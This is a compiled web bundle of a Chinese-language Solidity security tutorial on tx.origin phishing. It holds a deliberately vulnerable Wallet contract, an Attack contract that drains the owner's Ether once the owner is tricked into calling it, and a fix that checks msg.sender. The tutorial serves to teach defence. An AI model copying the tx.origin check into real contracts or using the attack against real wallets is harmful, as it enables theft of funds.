"use strict";(self.webpackChunkweb_3_blog=self.webpackChunkweb_3_blog||[]).push([[133],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>y});var r=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var c=r.createContext({}),s=function(e){var t=r.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},p=function(e){var t=s(e.components);return r.createElement(c.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,i=e.mdxType,o=e.originalType,c=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),d=s(n),y=i,g=d["".concat(c,".").concat(y)]||d[y]||u[y]||o;return n?r.createElement(g,a(a({ref:t},p),{},{components:n})):r.createElement(g,a({ref:t},p))}));function y(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var o=n.length,a=new Array(o);a[0]=d;var l={};for(var c in t)hasOwnProperty.call(t,c)&&(l[c]=t[c]);l.originalType=e,l.mdxType="string"==typeof e?e:i,a[1]=l;for(var s=2;s<o;s++)a[s]=n[s];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},4908:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>a,default:()=>u,frontMatter:()=>o,metadata:()=>l,toc:()=>s});var r=n(7462),i=(n(7294),n(3905));const o={},a="tx.origin\u9493\u9c7c",l={unversionedId:"solidity/solidity_hack/phishing_with_tx_orgin",id:"solidity/solidity_hack/phishing_with_tx_orgin",title:"tx.origin\u9493\u9c7c",description:"msg.sender \u548c tx.origin \u7684\u533a\u522b\u662f\u4ec0\u4e48\uff1f",source:"@site/docs/solidity/solidity_hack/phishing_with_tx_orgin.md",sourceDirName:"solidity/solidity_hack",slug:"/solidity/solidity_hack/phishing_with_tx_orgin",permalink:"/docs/solidity/solidity_hack/phishing_with_tx_orgin",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"solidity",previous:{title:"\u62d2\u7edd\u670d\u52a1",permalink:"/docs/solidity/solidity_hack/denial_of_service"},next:{title:"\u4f7f\u7528\u5916\u90e8\u5408\u7ea6\u9690\u85cf\u6076\u610f\u4ee3\u7801",permalink:"/docs/solidity/solidity_hack/hiding_malicious_code_with_external_contract"}},c={},s=[{value:"\u9884\u9632\u6280\u672f",id:"\u9884\u9632\u6280\u672f",level:3}],p={toc:s};function u(e){let{components:t,...n}=e;return(0,i.kt)("wrapper",(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"txorigin\u9493\u9c7c"},"tx.origin\u9493\u9c7c"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"msg.sender")," \u548c ",(0,i.kt)("inlineCode",{parentName:"p"},"tx.origin")," \u7684\u533a\u522b\u662f\u4ec0\u4e48\uff1f"),(0,i.kt)("p",null,"\u5982\u679c \u5408\u7ea6A \u8c03\u7528B, B\u8c03\u7528C,  \u5728C\u4e2d msg.sender \u662fB, tx.origin \u662fA."),(0,i.kt)("p",null,"\u6f0f\u6d1e\u63cf\u8ff0\uff1a"),(0,i.kt)("p",null,"\u6076\u610f\u5408\u7ea6\u53ef\u4ee5\u6b3a\u9a97 \u5408\u7ea6\u6240\u6709\u8005\u8c03\u7528\u53ea\u6709\u5408\u7ea6\u6240\u6709\u8005\u624d\u53ef\u4ee5\u8c03\u7528\u7684\u51fd\u6570\u3002"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\n/*\n\u94b1\u5305\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u5408\u7ea6\uff0c\u53ea\u6709\u6240\u6709\u8005\u624d\u80fd\u8f6c\u79fb \u4ee5\u592a\u5e01\u5230\u53e6\u4e00\u4e2a\u5730\u5740.\nWallet.transfer() \u4f7f\u7528 tx.origin \u6765\u68c0\u67e5 \u8c03\u7528\u8005\u662f\u6240\u6709\u8005\u3002\u8ba9\u6211\u4eec\u770b\u770b\u6211\u4eec\u5982\u4f55\u7834\u89e3\u8fd9\u4e2a\u5408\u7ea6\n*/\n\n/*\n1. Alice \u7528 10 \u4e2a Ether \u90e8\u7f72\u94b1\u5305 \n2. Eve \u4f7f\u7528 Alice \u7684\u94b1\u5305\u5408\u7ea6\u5730\u5740\u90e8\u7f72 Attack\u3002 \n3. Eve \u6b3a\u9a97 Alice \u8c03\u7528 Attack.attack() \n4. Eve \u6210\u529f\u4ece Alice \u7684\u94b1\u5305\u4e2d\u5077\u8d70\u4e86 Ether\n\nAlice \u88ab\u9a97\u8c03\u7528 Attack.attack()\u3002\n\u5728 Attack.attack() \u5185\u90e8\uff0c\u5b83 \u8bf7\u6c42\u5c06 Alice \u94b1\u5305\u4e2d\u7684\u6240\u6709\u8d44\u91d1\u8f6c\u79fb\u5230 Eve \u7684\u5730\u5740\u3002\n\u7531\u4e8e Wallet.transfer() \u4e2d\u7684 tx.origin \u7b49\u4e8e Alice \u7684\u5730\u5740\uff0c \u5b83\u6388\u6743\u8f6c\u8ba9\u3002\u94b1\u5305\u5c06\u6240\u6709\u4ee5\u592a\u5e01\u8f6c\u79fb\u7ed9 Eve\u3002\n*/\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        require(tx.origin == owner, "Not owner");\n\n        (bool sent, ) = _to.call{value: _amount}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        // here\n        owner = payable(msg.sender);\n    }\n    // alice call  \n    // tx.origin is alice, msg.sender = attack\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n')),(0,i.kt)("h3",{id:"\u9884\u9632\u6280\u672f"},"\u9884\u9632\u6280\u672f"),(0,i.kt)("p",null,"\u4f7f\u7528 ",(0,i.kt)("inlineCode",{parentName:"p"},"msg.sender")," \u800c\u4e0d\u662f ",(0,i.kt)("inlineCode",{parentName:"p"},"tx.origin")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity"},'function transfer(address payable _to, uint256 _amount) public {\n  require(msg.sender == owner, "Not owner");\n\n  (bool sent, ) = _to.call{value: _amount}("");\n  require(sent, "Failed to send Ether");\n}\n')))}u.isMDXComponent=!0}}]);